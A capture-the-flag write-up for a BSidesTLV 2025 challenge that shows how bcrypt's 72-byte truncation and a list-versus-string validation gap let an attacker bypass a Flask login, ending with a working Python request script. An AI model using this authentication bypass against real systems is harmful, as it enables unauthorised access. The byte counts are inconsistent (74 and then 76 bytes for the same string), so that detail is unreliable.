# BSidesTLV 2025 - shortcut: bcrypt 72-Byte Truncation Bypass

The Flask login endpoint uses bcrypt to verify credentials. The `auth` function builds the value to hash by concatenating `api-version + "admin" + PASSWORD` and comparing it against `api-version + user + pass`:

```python
def auth(params):
    salt = bcrypt.gensalt(rounds=12)
    version = str(params["api-version"]).encode()
    expected = bcrypt.hashpw(version + b"admin" + PASSWORD.encode(), salt)
    received = bcrypt.hashpw(version + params["user"].encode() + params["pass"].encode(), salt)
    return expected == received
```

## The bcrypt 72-Byte Limit

bcrypt silently truncates its input to 72 bytes. If we can make `version` consume all 72 bytes, then `"admin" + PASSWORD` and `user + pass` are both truncated away entirely - and the two hashes become equal regardless of what we send as credentials.

## Bypassing the Length Validation

`validate-params` rejects any `api-version` whose `len()` is not 1:

```python
if len(params["api-version"]) != 1:
    return False
```

Sending `api-version` as a JSON array satisfies this check - `len(["A" * 70])` is `1`. But when `auth` calls `str(params["api-version"])`, Python serialises the list as `"['AAAA...']"`, which is 74 characters. The surrounding brackets and quotes add 4 bytes, so a 68-character string inside the array produces exactly 72 bytes after stringification, consuming the entire bcrypt input budget.

## Exploit

```python
import requests

payload = {
    "user": "a",
    "pass": "b",
    "cmd": "get-flag",
    "api-version": ["A" * 70]
}

response = requests.post(
    "https://bstlv25-shortcut.chals.io/login",
    json=payload
)
print(response.text)
```

`str(["A" * 70])` is `"['AAAA...AAA']"` - 76 bytes, which exceeds 72, ensuring the suffix is truncated. Both the expected and received hashes are computed from the same truncated prefix and therefore match.
